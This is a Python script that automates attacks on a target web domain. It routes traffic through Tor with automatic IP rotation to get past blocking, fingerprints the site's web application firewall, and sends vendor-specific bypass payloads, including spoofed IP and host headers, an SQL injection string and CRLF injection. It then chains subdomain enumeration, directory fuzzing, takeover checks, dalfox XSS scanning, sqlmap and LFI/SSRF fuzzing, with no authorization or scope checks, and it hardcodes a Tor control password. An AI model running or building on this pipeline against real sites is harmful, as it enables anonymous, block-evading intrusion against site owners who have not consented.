#!/usr/bin/env python3
import argparse
import subprocess
import time
import os
import sys
import re
from urllib.parse import urlparse

import requests
from stem import Signal
from stem.control import Controller
from requests.exceptions import RequestException, ConnectionError
import shutil


# =======================
#   GLOBAL CONFIG
# =======================

TOR_PROXIES = {
    "http": "socks5://127.0.0.1:9050",
    "https": "socks5://127.0.0.1:9050"
}
TOR_CONTROL_PORT = 9051
TOR_CONTROL_PASSWORD = "m06ahmed"
BLOCK_STATUS_CODES = {403, 429}


# =======================
#   TOR + HTTP HELPERS
# =======================

def rotate_ip():
    print("[*] Asking Tor for NEW IDENTITY...")
    try:
        with Controller.from_port(port=TOR_CONTROL_PORT) as c:
            c.authenticate(TOR_CONTROL_PASSWORD)
            c.signal(Signal.NEWNYM)
        time.sleep(10)
        print("[+] Tor circuit changed.")
        return True
    except Exception as e:
        print(f"[!] Tor rotation failed: {e}")
        return False


def tor_request(method, url, max_retries=5, **kwargs):
    """
    HTTP request through Tor; if blocked (403/429) or connection errors,
    rotate IP and retry up to max_retries.
    """
    kwargs.setdefault("proxies", TOR_PROXIES)
    kwargs.setdefault("timeout", 20)

    for attempt in range(1, max_retries + 1):
        try:
            r = requests.request(method, url, **kwargs)
            if r.status_code in BLOCK_STATUS_CODES:
                print(f"[HTTP {r.status_code}] blocked {url}, rotating (attempt {attempt}/{max_retries})")
                if attempt == max_retries:
                    return r
                rotate_ip()
                continue
            return r
        except (RequestException, ConnectionError) as e:
            print(f"[HTTP error] {e}, rotating (attempt {attempt}/{max_retries})")
            if attempt == max_retries:
                raise
            rotate_ip()

    raise RuntimeError("tor_request exhausted retries")


def run_pc(cmd, timeout=600):
    """
    Run a shell command through proxychains (for external tools).
    """
    full = f"proxychains {cmd}"
    print(f"\n$ {full}")
    try:
        p = subprocess.run(
            full,
            shell=True,
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=timeout
        )
        if p.stdout:
            print(p.stdout.strip())
        if p.stderr:
            print(p.stderr.strip(), file=sys.stderr)
        return p.stdout
    except subprocess.TimeoutExpired:
        print(f"[!] Timeout: {cmd}")
        return ""


# =======================
#   WAF DETECTION + BYPASS
# =======================

def detect_waf(url):
    """
    Detect WAF using wafw00f via proxychains/Tor
    """
    output = run_pc(f"wafw00f {url}", timeout=300)
    print(output)

    match = re.search(r"is behind\s+(.+?)(?:\s+\(|$)", output, re.IGNORECASE)
    if match:
        waf_name = match.group(1).strip()
        print(f"FireWall is: {waf_name}\n")
        return waf_name
    elif "No WAF detected" in output:
        print("Couldn't detect a firewall.\n")
        return None
    else:
        print("Couldn't detect a firewall")
        return None


waf_map = {
    "Cloudflare": "bypass_cloudflare",
    "ModSecurity": "bypass_modsecurity",
    "Incapsula": "bypass_incapsula",
    "Sucuri": "bypass_sucuri",
    "Barracuda": "bypass_barracuda",
    "AWS Elastic Load Balancer": "bypass_aws",
    "BIG-IP": "bypass_f5",
    "Kona SiteDefender": "bypass_akamai",
    "FortiWeb": "bypass_fortiweb",
    "Sophos": "bypass_sophos",
    "Azure Application Gateway": "bypass_azure",
    "SiteLock": "bypass_sitelock",
    "StackPath": "bypass_stackpath",
    "AppWall": "bypass_radware",
    "NetScaler": "bypass_citrix",
    "Wallarm": "bypass_wallarm",
    "IndusGuard": "bypass_apptrana",
    "Reblaze": "bypass_reblaze",
    "SafeDog": "bypass_safedog",
    "NAXSI": "bypass_naxsi"
}


def test_payloads(url, payloads):
    """
    Send WAF-bypass payloads via Tor + rotation, log 200 OK to 200-ok.txt.
    """
    with open("200-ok.txt", "a", encoding="utf-8") as file:
        for payload in payloads:
            test_url = payload.get("url", url)
            method = payload.get("method", "GET")
            headers = payload.get("headers", {})
            data = payload.get("data", None)
            try:
                resp = tor_request(method, test_url, headers=headers, data=data, timeout=12)
                msg = f"[{payload['desc']}] -> {method} {test_url} | {resp.status_code} | Content-length: {len(resp.text)}"
                print(msg)
                if resp.status_code == 200:
                    file.write(msg + "\n")
            except Exception as e:
                print(f"[{payload['desc']}] -> Error: {e}")

def mutate_path(url, new_segment):
    p = urlparse(url)
    # Example: replace /path with /new_segment/path
    new_path = "/" + new_segment.strip("/") + "/" + p.path.lstrip("/")
    return p._replace(path=new_path).geturl()

def bypass_cloudflare(url):
    payloads = [
        {"desc": "X-Forwarded-For: 127.0.0.1", "headers": {"X-Forwarded-For": "127.0.0.1"}},
        {"desc": "User-Agent: Googlebot", "headers": {"User-Agent": "Googlebot"}},
        {"desc": "Encoded path %2e", "url": mutate_path(url, "%2e")},
        {"desc": "Double encoded slash", "url": url.replace("/", "/%252F/")},
        {"desc": "Nullbyte at end", "url": url + "%2500"},
        {"desc": "HEAD method", "method": "HEAD"},
        {"desc": "OPTIONS method", "method": "OPTIONS"},
        {"desc": "PATCH method", "method": "PATCH"},
        {"desc": "Big POST body", "method": "POST", "data": "Z" * 8000},
        {"desc": "Extra Query param", "url": url + "?q=<test-tag>"},
        {"desc": "Multiple params", "url": url + "?id=1&id=1"},
        {"desc": "X-Original-URL", "headers": {"X-Original-URL": "/admin"}},
        {"desc": "X-Rewrite-URL", "headers": {"X-Rewrite-URL": "/admin"}},
        {"desc": "Forwarded header with host", "headers": {"Forwarded": "for=127.0.0.1;host=evil.com"}},
        {"desc": "X-Forwarded-Host: evil.com", "headers": {"X-Forwarded-Host": "evil.com"}},
    ]
    print("\nCloudflare Payloads:")
    test_payloads(url, payloads)


def bypass_modsecurity(url):
    payloads = [
        {"desc": "SQLi param", "url": url + "?id=1' OR '1'='1"},
        {"desc": "Encoded path %27", "url": mutate_path(url, "%27")},
        {"desc": "X-Originating-IP", "headers": {"X-Originating-IP": "127.0.0.2"}},
        {"desc": "Content-Type: text/xml", "headers": {"Content-Type": "text/xml"}},
        {"desc": "POST JSON", "method": "POST", "data": '{"foo":"bar"}', "headers": {"Content-Type": "application/json"}},
        {"desc": "Multipart POST", "method": "POST", "headers": {"Content-Type": "multipart/form-data"},
         "data": "--boundary\r\nContent-Disposition: form-data; name=\"test\"\r\n\r\ndata\r\n--boundary--"},
        {"desc": "PATCH method", "method": "PATCH"},
        {"desc": "TRACE method", "method": "TRACE"}
    ]
    print("\nModSecurity Payloads:")
    test_payloads(url, payloads)


def bypass_incapsula(url):
    payloads = [
        {"desc": "X-Real-IP header", "headers": {"X-Real-IP": "127.0.0.1"}},
        {"desc": "Client-IP header", "headers": {"X-Client-IP": "127.0.0.4"}},
        {"desc": "OPTIONS method", "method": "OPTIONS"},
        {"desc": "Big POST", "method": "POST", "data": "A" * 6000},
        {"desc": "X-Forwarded-Host", "headers": {"X-Forwarded-Host": "evil.com"}},
        {"desc": "Param base64", "url": url + "?user=YWRtaW4="}
    ]
    print("\nIncapsula Payloads:")
    test_payloads(url, payloads)


def bypass_sucuri(url):
    payloads = [
        {"desc": "X-Forwarded-For: 8.8.8.8", "headers": {"X-Forwarded-For": "8.8.8.8"}},
        {"desc": "Host: localhost", "headers": {"Host": "localhost"}},
        {"desc": "Extra /./", "url": url + "/./"},
        {"desc": "Query test", "url": url + "?test=1"},
        {"desc": "Unicode param name", "url": url + "?％61d=admin"},
        {"desc": "SOAPAction header", "headers": {"SOAPAction": "adminLogin"}},
        {"desc": "Big POST", "method": "POST", "data": "SUCURI" * 2000}
    ]
    print("\nSucuri Payloads:")
    test_payloads(url, payloads)


def bypass_barracuda(url):
    payloads = [
        {"desc": "Encoded path (%20)", "url": mutate_path(url, "%20")},
        {"desc": "Host: localhost", "headers": {"Host": "localhost"}},
        {"desc": "Nullbyte %00", "url": url + "%2500"},
        {"desc": "OPTIONS method", "method": "OPTIONS"},
        {"desc": "PATCH method", "method": "PATCH"},
        {"desc": "CRLF X-Header", "headers": {"X-Header": "foo\r\nbar: evil"}}
    ]
    print("\nBarracuda Payloads:")
    test_payloads(url, payloads)


def bypass_aws(url):
    payloads = [
        {"desc": "Query pollution", "url": url + "?a=1&a=2"},
        {"desc": "Big POST", "method": "POST", "data": "X" * 35000},
        {"desc": "User-Agent: curl", "headers": {"User-Agent": "curl/7.85.0"}},
        {"desc": "Encoded path (%25)", "url": mutate_path(url, "%25")}
    ]
    print("\nAWS Payloads:")
    test_payloads(url, payloads)


def bypass_f5(url):
    payloads = [
        {"desc": "X-Forwarded-For header", "headers": {"X-Forwarded-For": "127.0.0.2"}},
        {"desc": "HEAD method", "method": "HEAD"},
        {"desc": "Encoded path (%2f)", "url": mutate_path(url, "%2f")},
        {"desc": "OPTIONS method", "method": "OPTIONS"},
        {"desc": "Delete method", "method": "DELETE"}
    ]
    print("\nBIG-IP F5 Payloads:")
    test_payloads(url, payloads)


def bypass_akamai(url):
    payloads = [
        {"desc": "User-Agent Edge", "headers": {"User-Agent": "Edge"}},
        {"desc": "OPTIONS method", "method": "OPTIONS"},
        {"desc": "Random param", "url": url + "?akamai=1"}
    ]
    print("\nAkamai Payloads:")
    test_payloads(url, payloads)


def bypass_fortiweb(url):
    payloads = [
        {"desc": "IPv6 X-Forwarded-For", "headers": {"X-Forwarded-For": "::1"}},
        {"desc": "Encoded path (%2e)", "url": mutate_path(url, "%2e")},
        {"desc": "POST big", "method": "POST", "data": "A" * 10000},
        {"desc": "PATCH method", "method": "PATCH"}
    ]
    print("\nFortiWeb Payloads:")
    test_payloads(url, payloads)


def bypass_sophos(url):
    payloads = [
        {"desc": "X-Originating-IP", "headers": {"X-Originating-IP": "127.0.0.2"}},
        {"desc": "User-Agent: SophosTest", "headers": {"User-Agent": "SophosTest"}},
        {"desc": "Extra param", "url": url + "?sophos=1"},
        {"desc": "Forwarded header", "headers": {"Forwarded": "for=8.8.8.8"}}
    ]
    print("\nSophos Payloads:")
    test_payloads(url, payloads)


def bypass_azure(url):
    payloads = [
        {"desc": "Referer: office.com", "headers": {"Referer": "https://office.com"}},
        {"desc": "Encoded path %2e", "url": mutate_path(url, "%2e")},
        {"desc": "Big POST", "method": "POST", "data": "B" * 10000}
    ]
    print("\nAzure App Gateway Payloads:")
    test_payloads(url, payloads)


def bypass_sitelock(url):
    payloads = [
        {"desc": "User-Agent: SiteLockScanner", "headers": {"User-Agent": "SiteLockScanner"}},
        {"desc": "Big param", "url": url + "?sitelock=" + "A" * 500},
        {"desc": "OPTIONS method", "method": "OPTIONS"},
        {"desc": "__proto__ param", "url": url + "?__proto__=1"}
    ]
    print("\nSiteLock Payloads:")
    test_payloads(url, payloads)


def bypass_stackpath(url):
    payloads = [
        {"desc": "X-Client-IP header", "headers": {"X-Client-IP": "4.4.4.4"}},
        {"desc": "Big POST", "method": "POST", "data": "Stack" * 2000},
        {"desc": "Forwarded Host", "headers": {"X-Forwarded-Host": "test.com"}}
    ]
    print("\nStackPath Payloads:")
    test_payloads(url, payloads)


def bypass_radware(url):
    payloads = [
        {"desc": "X-Radware header", "headers": {"X-Radware": "test"}},
        {"desc": "Random param", "url": url + "?radware=1"},
        {"desc": "Encoded param", "url": url + "?radware=%2e"}
    ]
    print("\nRadware AppWall Payloads:")
    test_payloads(url, payloads)


def bypass_citrix(url):
    payloads = [
        {"desc": "X-Citrix header", "headers": {"X-Citrix": "test"}},
        {"desc": "Encoded param", "url": url + "?citrix=%2e%2e"}
    ]
    print("\nCitrix NetScaler Payloads:")
    test_payloads(url, payloads)


def bypass_wallarm(url):
    payloads = [
        {"desc": "X-Wallarm header", "headers": {"X-Wallarm": "test"}},
        {"desc": "POST /wallarm", "method": "POST", "data": "WALLARM"},
        {"desc": "Trace method", "method": "TRACE"}
    ]
    print("\nWallarm Payloads:")
    test_payloads(url, payloads)


def bypass_apptrana(url):
    payloads = [
        {"desc": "X-IndusGuard header", "headers": {"X-IndusGuard": "true"}},
        {"desc": "Param test", "url": url + "?apptrana=1"},
        {"desc": "Big POST", "method": "POST", "data": "INDUS" * 400}
    ]
    print("\nAppTrana (IndusGuard) Payloads:")
    test_payloads(url, payloads)


def bypass_reblaze(url):
    payloads = [
        {"desc": "X-Reblaze header", "headers": {"X-Reblaze": "test"}},
        {"desc": "Encoded param", "url": url + "?reblaze=%2e"},
        {"desc": "XML param", "url": url + "?xml=%3Ctest%3E"}
    ]
    print("\nReblaze Payloads:")
    test_payloads(url, payloads)


def bypass_safedog(url):
    payloads = [
        {"desc": "X-SafeDog header", "headers": {"X-SafeDog": "test"}},
        {"desc": "Random param", "url": url + "?safedog=1"},
        {"desc": "Encoded param", "url": url + "?safe=%2e"}
    ]
    print("\nSafeDog Payloads:")
    test_payloads(url, payloads)


def bypass_naxsi(url):
    payloads = [
        {"desc": "X-NAXSI header", "headers": {"X-NAXSI": "test"}},
        {"desc": "Encoded param", "url": url + "?naxsi=%2e%2e"}
    ]
    print("\nNAXSI Payloads:")
    test_payloads(url, payloads)


def bypass_default(url):
    payloads = [
        {"desc": "Simple GET", "headers": {}},
        {"desc": "HEAD method", "method": "HEAD"},
        {"desc": "OPTIONS method", "method": "OPTIONS"},
        {"desc": "Extra param in GET", "url": url + "?debug=1"},
        {"desc": "PATCH method", "method": "PATCH"},
        {"desc": "User-Agent: Generic bot", "headers": {"User-Agent": "BROKEN-TOOL-XYZ/1.0"}}
    ]
    print("\nGeneral Payloads:")
    test_payloads(url, payloads)


def stage_waf(url):
    """
    Detect WAF and run appropriate bypass payloads first.
    """
    waf_name = detect_waf(url)
    found = False
    if waf_name:
        for w, func in waf_map.items():
            if w in waf_name:
                print(f"[*] Detected {w}, running {func} payloads...")
                globals()[func](url)
                found = True
                break
        if not found:
            print("[*] Unknown WAF, running generic payloads.")
            bypass_default(url)
    else:
        print("[*] Unknown WAF, running generic payloads.")
        bypass_default(url)


# =======================
#   STAGE 1: SUBDOMAINS
# =======================

def enum_subdomains(domain, out_file="subdomains.txt"):
    tmp_subs = set()
    out = run_pc(f"subfinder -d {domain}", timeout=600)
    if not out.strip():
        tmp_subs.add(f"https://{domain}")
    tmp_subs.update(x.strip() for x in out.splitlines() if x.strip())
    subs = sorted(tmp_subs)
    with open(out_file, "w") as f:
        for s in subs:
            f.write(s + "\n")
    print(f"[+] Subdomains: {len(subs)} → {out_file}")
    return out_file


def probe_httpx(sub_file, out_file="live.txt"):
    run_pc(f"httpx -l {sub_file} -mc 200,301,302 -o {out_file}", timeout=900)
    if os.path.exists(out_file):
        lines = [l.strip() for l in open(out_file) if l.strip()]
    else:
        lines = []
    print(f"[+] Live hosts: {len(lines)} → {out_file}")
    return out_file


# =======================
#   STAGE 2: WAYBACK + FUZZ
# =======================

def wayback_urls(domain, out_file="wayback.txt"):
    run_pc(f"waybackpy --url {domain} -ku > {out_file}", timeout=900)
    if os.path.exists(out_file):
        urls = [l.strip() for l in open(out_file) if l.strip()]
    else:
        urls = []
    print(f"[+] Wayback URLs: {len(urls)} → {out_file}")
    return out_file


def fuzz_dirs_ffuf(live_file, wordlist, out_dir="ffuf_dirs"):
    os.makedirs(out_dir, exist_ok=True)
    with open(live_file) as f:
        for host in f:
            host = host.strip()
            if not host:
                continue
            safe = host.replace("://", "_").replace("/", "_")
            out_csv = os.path.join(out_dir, f"{safe}.csv")
            cmd = (
                f"ffuf -w {wordlist} -u {host.rstrip('/')}/FUZZ "
                f"-mc 200,301,302 -of csv -o {out_csv} -t 50"
            )
            run_pc(cmd, timeout=900)
    print(f"[+] FFUF dir fuzzing done → {out_dir}")


# =======================
#   STAGE 3: TAKEOVER / PARAMS
# =======================

def nuclei_takeover(live_file, templates_dir=os.path.expanduser("~/nuclei-templates"), out_file="nuclei_takeover.txt"):
    cmd = (
        f"nuclei -l {live_file} "
        f"-t {templates_dir}/takeovers/ -o {out_file} "
        f"-timeout 50"
    )
    run_pc(cmd, timeout=3600)
    print(f"[+] Nuclei takeover scan done → {out_file}")


def build_param_urls_from_wayback(wayback_file, params_file="params.txt"):
    with open(wayback_file) as f, open(params_file, "w") as out:
        for line in f:
            u = line.strip()
            if "=" in u:
                out.write(u + "\n")
    print(f"[+] Parameterized URLs → {params_file}")
    return params_file


def run_paramspider(liveurls, out_file="paramspider_raw.txt"):

    cmd = f"paramspider --list {liveurls}"

    print(f"\n$ {cmd}")

    try:
        p = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            timeout=900
        )

        if p.returncode != 0:
            print(f"[!] ParamSpider failed (exit code {p.returncode})")
            if p.stderr.strip():
                print(f"[ParamSpider STDERR]\n{p.stderr.strip()}")
        else:
            print(f"[+] ParamSpider finished")
            for fil in liveurls:
                if fil.startswith("https://"):
                    firstfilename = re.sub(r'^https?://', '', fil)
                elif fil.startswith("http://"):
                    firstfilename = re.sub(r'^http?://', '', fil)
                else:
                    firstfilename = fil

                # Replace problematic characters
                finalfilename = re.sub(r'[/:.]', '_', firstfilename)
                param_file = f"{finalfilename}.txt"
                if os.path.exists(param_file):
                    with open(param_file, "r") as f_in, open(out_file, "a") as f_out:
                        for line in f_in:
                            line = line.strip()
                            if line:
                                f_out.write(line + "\n")
            if p.stdout.strip():
                print(f"[ParamSpider STDOUT]\n{p.stdout.strip()}")

    except subprocess.TimeoutExpired:
        print("[!] ParamSpider timed out after 900 seconds")
    except Exception as e:
        print(f"[!] ParamSpider error: {e}")

    return out_file



# =======================
#   STAGE 4: XSS / SQLi / LFI / SSRF
# =======================

def xss_with_dalfox(params_file, out_file="xss_dalfox.txt"):
    cmd = f"proxychains dalfox file {params_file} --only-poc --worker 1 -o {out_file}"
    print(f"\n$ {cmd}")
    try:
        p = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            timeout=600
        )

        # Handle errors
        if p.returncode != 0:
            print(f"[!] Dalfox failed (exit code {p.returncode})")
            if p.stderr.strip():
                print(f"[Dalfox STDERR] {p.stderr.strip()}")
        else:
            print(f"[+] Dalfox XSS done → {out_file}")
            if p.stdout.strip():
                print(f"[Dalfox STDOUT] {p.stdout.strip()}")

    except subprocess.TimeoutExpired:
        print("[!] Dalfox timed out after 600 seconds")
    except Exception as e:
        print(f"[!] Dalfox execution error: {e}")


def sqli_with_sqlmap(params_file, out_dir="sqlmap_out"):
    os.makedirs(out_dir, exist_ok=True)
    cmd = (
        "proxychains sqlmap -m {pf} --batch --random-agent "
        "--level 1 --risk 1 --output-dir={od}"
    ).format(pf=params_file, od=out_dir)
    print(f"\n$ {cmd}")
    subprocess.run(cmd, shell=True)
    print(f"[+] SQLMap run finished → {out_dir}")


def lfi_ssrf_with_ffuf(params_file, payloads_file, out_dir="ffuf_lfi_ssrf"):
    os.makedirs(out_dir, exist_ok=True)
    with open(params_file) as f:
        for base in f:
            base = base.strip()
            if not base or "=" not in base:
                continue
            url = re.sub(r"=([^&]*)", "=FUZZ", base, count=1)
            safe = re.sub(r"[^a-zA-Z0-9]", "_", url)[:80]
            out = os.path.join(out_dir, f"{safe}.csv")
            cmd = (
                f"ffuf -w {payloads_file} -u \"{url}\" "
                f"-mc 200,500 -of csv -o {out}"
            )
            run_pc(cmd, timeout=1200)
    print(f"[+] FFUF LFI/SSRF fuzzing → {out_dir}")


# =======================
#   Tool CHECKER
# =======================

def check_tools():
    tools = {
        "proxychains": "sudo apt install proxychains (after installing, edit /etc/proxychains.conf to use socks5 127.0.0.1 9050)",
        "paramspider": "sudo apt install paramspider (after installing, edit /usr/lib/python3/dist-packages/paramspider/main.py to add 'import re' at the top and to add this line 'domainname = re.sub(r'[^a-zA-Z0-9]', '_', domain)' and then edit the result file path accordingly to be 'result_file = f'{domainname}.txt' to avoid issues with special characters in domain names')",
        "tor": "sudo apt install tor (after installing tor, edit /etc/tor/torrc to enable ControlPort and set HashedControlPassword using 'tor --hash-password <password>')",
        "subfinder": "go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest",
        "httpx": "go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest",
        "ffuf": "sudo apt install ffuf",
        "waybackpy": "sudo apt install waybackpy",
        "nuclei": "go install -v github.com/projectdiscovery/nuclei/cmd/nuclei@latest",
        "dalfox": "go install github.com/hahwul/dalfox/v2@latest",
        "sqlmap": "sudo apt install sqlmap",
        "wafw00f": "sudo apt install wafw00f",
    }
    missing_tools = []

    print("\n========== Tool Check ==========")
    for tool, install_cmd in tools.items():
        if shutil.which(tool):
            print(f"[OK] {tool}")
        else:
            print(f"[MISSING] {tool} - install with: {install_cmd}")
            missing_tools.append(tool)
    print("================================\n")
    if missing_tools:
        print("[ERROR] Missing tools detected. Please install them and try again.")
        sys.exit(1)




# =======================
#   MAIN ORCHESTRATOR
# =======================

def main():
    check_tools()
    ap = argparse.ArgumentParser(description="Tor + proxychains WAF + recon & vuln pipeline")
    ap.add_argument("-u", "--url", required=True, help="Target URL, e.g. https://example.com/")
    ap.add_argument("-w", "--wordlist", required=True, help="Wordlist for dirs/subdomains")
    ap.add_argument("--lfi-payloads", help="Wordlist for LFI/SSRF payloads (optional)")
    args = ap.parse_args()

    parsed = urlparse(args.url)
    domain = parsed.netloc.split(":")[0]

    print(f"[+] Target URL: {args.url}")
    print(f"[+] Domain: {domain}")

    # Optional initial rotation
    #rotate_ip()

    # 0) WAF detection + bypass attempts (Tor + proxychains)
    stage_waf(args.url)

    # 1) Subdomains → live
    subs_file = enum_subdomains(domain, out_file="subdomains.txt")
    live_file = probe_httpx(subs_file, out_file="live.txt")

    # 2) Historical URLs
    wayback_file = wayback_urls(domain, out_file="wayback.txt")

    # 3) Fuzz dirs on live
    fuzz_dirs_ffuf(live_file, args.wordlist, out_dir="ffuf_dirs")

    # 4) Nuclei takeover
    nuclei_takeover(live_file, templates_dir=os.path.expanduser("~/nuclei-templates"), out_file="nuclei_takeover.txt")

    # 5) Build param URLs
    params_file = build_param_urls_from_wayback(wayback_file, params_file="params.txt")
    # Run ParamSpider (GitHub version)
    paramspider_file = run_paramspider(live_file, out_file="paramspider_raw.txt")

    # If output exists, merge results into params.txt
    if paramspider_file and os.path.exists(paramspider_file):
        with open(params_file, "a") as out:
            with open(paramspider_file, "r") as ps:
                for line in ps:
                    url = line.strip()
                    if "=" in url and url.startswith("http"):
                        out.write(url + "\n")


    # 6) XSS
    xss_with_dalfox(params_file, out_file="xss_dalfox.txt")

    # 7) SQLi
    sqli_with_sqlmap(params_file, out_dir="sqlmap_out")

    # 8) LFI / SSRF fuzz (optional)
    if args.lfi_payloads:
        lfi_ssrf_with_ffuf(params_file, args.lfi_payloads, out_dir="ffuf_lfi_ssrf")


if __name__ == "__main__":
    main()
